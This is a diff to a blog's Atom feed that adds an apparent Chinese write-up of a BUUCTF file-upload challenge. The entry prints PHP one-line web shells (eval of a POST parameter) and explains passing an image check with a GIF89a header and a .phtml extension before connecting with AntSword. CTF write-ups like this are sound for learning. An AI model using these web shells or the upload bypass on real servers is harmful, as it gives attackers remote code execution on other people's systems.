@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2022-04-17T12:42:33.302Z</updated>
+  <updated>2022-04-19T11:29:25.719Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,23 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>GIF89a 图片头文件欺骗</title>
+    <link href="http://example.com/2022/04/14/%E5%9B%BE%E7%89%87%E5%A4%B4%E6%96%87%E4%BB%B6%E6%AC%BA%E9%AA%97/"/>
+    <id>http://example.com/2022/04/14/%E5%9B%BE%E7%89%87%E5%A4%B4%E6%96%87%E4%BB%B6%E6%AC%BA%E9%AA%97/</id>
+    <published>2022-04-14T12:02:56.000Z</published>
+    <updated>2022-04-19T11:29:25.719Z</updated>
+    
+    <content type="html"><![CDATA[<p>BUUCTF——[极客大挑战 2019]Upload 1</p><span id="more"></span><hr><?php @eval($_POST['whhzt']);?><p>![](<a href="https://s1.328888.xyz/2022/04/19/rslAP.png%EF%BC%89">https://s1.328888.xyz/2022/04/19/rslAP.png）</a><br>上传一句话木马&lt;?不能上传成功，换一种木马</p><script language='php'>@eval($_POST['whhzt']);</script><p>出现提示： 提示：Don’t lie to me, it’s not image at all!!!<br><img src="https://s1.328888.xyz/2022/04/19/rstYm.png"><br>GIF89a 图片头文件欺骗：在文件前面加文件头：GIF89a，php会检测其为gif图片。使用getimagesize函数无法判断其图片是无效的。<br>![](<a href="https://s1.328888.xyz/2022/04/19/rs5MA.png%EF%BC%89">https://s1.328888.xyz/2022/04/19/rs5MA.png）</a><br>最后在burpsuite中把上传类型jpg改为phtml<br>![](<a href="https://s1.328888.xyz/2022/04/19/rszXS.png%EF%BC%89">https://s1.328888.xyz/2022/04/19/rszXS.png）</a><br>上传成功！<br>![](<a href="https://s1.328888.xyz/2022/04/19/rsCpR.png%EF%BC%89">https://s1.328888.xyz/2022/04/19/rsCpR.png）</a><br>然后蚁剑连接<br><img src="https://s1.328888.xyz/2022/04/19/rs3fd.png"></p>]]></content>
+    
+    
+    <summary type="html">&lt;p&gt;BUUCTF——[极客大挑战 2019]Upload 1&lt;/p&gt;</summary>
+    
+    
+    
+    
+  </entry>
   
   <entry>
     <title>一句话木马</title>
